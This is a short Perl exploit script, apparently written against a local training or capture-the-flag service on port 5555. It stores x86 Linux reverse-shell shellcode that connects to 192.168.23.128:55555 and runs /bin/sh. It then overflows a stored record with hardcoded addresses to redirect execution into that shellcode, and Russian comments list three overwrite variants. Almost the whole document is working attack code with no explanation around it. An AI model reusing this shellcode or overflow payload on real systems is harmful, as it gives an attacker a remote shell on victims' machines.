#!/usr/bin/perl -w

use IO::Socket;

my $buf;
my $ebp;
my $sock = IO::Socket::INET->new("127.0.0.1:5555") or die $@;
$sock->autoflush(1);

my $sc = "\x68".
"\xC0\xA8\x17\x80".  # 192.168.23.128
"\x5e\x66\x68".
"\xd9\x03".          # 55555
"\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xce";


print $sock "PUT\n";
print $sock "id01\n";
print $sock "AAAA\n";

print $sock "PUT\n";
print $sock "id02\n";
print $sock $sc . "\n";

print $sock "UPDATE\n";
print $sock "id01\n";
# третий способ с адресом шеллкода
print $sock  pack("L", 0x0804B078) . "A"x28 . pack("L", 0x0804b008) . pack("L", 0x0804b060) . "A"x8 . pack("L", 0x0804B028) . "\x48" . "\n";

# второй способ перезаписать с сохранением адресов в структуре
#print $sock "A"x32 . pack("L", 0x0804b008) . pack("L", 0x0804b060) . "A"x8 . pack("L", 0x0804B070) . "\x48" . "\n";

# первый способ перезаписать адрес таблицы
#print $sock "A"x48 . pack("L", 0x0804B070) . "\x48" . "\n";

print $sock "UPDATE\n";
print $sock "id02\n";
print $sock "shell execute!!!\n";


#0x08048c2b
#0x080490D6
#0x0804B078
#08 B0 04 08 60 B0 04 08